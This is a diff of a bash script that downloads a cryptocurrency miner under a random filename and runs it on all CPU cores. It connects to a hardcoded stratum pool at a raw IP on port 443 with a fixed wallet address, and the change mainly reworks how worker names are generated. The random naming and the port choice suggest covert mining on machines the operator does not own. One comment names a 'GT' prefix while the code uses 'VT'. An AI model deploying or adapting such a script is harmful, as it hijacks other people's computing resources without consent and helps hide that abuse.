@@ -1,16 +1,6 @@
 #!/bin/bash
 
-# Function to generate a random uppercase worker name (6 letters)
-generate_random_worker_name() {
-    tr -dc 'A-Z' < /dev/urandom | head -c 6
-}
-
-# Get today's date in Asia/Tokyo timezone (adjust TZ as needed)
-get_today_date_asia() {
-    TZ="Asia/Tokyo" date +"%Y%m%d"
-}
-
-# Function to generate a random filename (10 characters, lowercase letters and digits)
+# Function to generate a random filename (10 characters, no prefix)
 generate_random_filename() {
     tr -dc 'a-z0-9' < /dev/urandom | head -c 10
     echo
@@ -43,6 +33,13 @@ set_permissions() {
     fi
 }
 
+# Generate a worker name using today's date in India time zone with prefix GT and random suffix
+generate_worker_name() {
+    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
+    random_suffix=$(tr -dc 'a-z0-9' </dev/urandom | head -c 4)
+    echo "VT${date_str}${random_suffix}"
+}
+
 # Run the miner using all CPU cores
 run_miner() {
     miner_filename=$1
@@ -50,7 +47,7 @@ run_miner() {
     stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@45.33.12.109:443"
 
     echo "🚀 Starting miner with worker name: $worker_name"
-    if ./"$miner_filename" -stratum "$stratum_url"; then
+    if ./$miner_filename -stratum "$stratum_url"; then
         echo "✅ Miner started successfully."
     else
         echo "❌ Error running the miner."
@@ -68,10 +65,7 @@ main() {
     miner_filename=$(generate_random_filename)
     download_miner "$miner_filename"
     set_permissions "$miner_filename"
-
-    today_date=$(get_today_date_asia)
-    worker_name="VT2${today_date}"
-
+    worker_name=$(generate_worker_name)
     run_miner "$miner_filename" "$worker_name"
 }
 
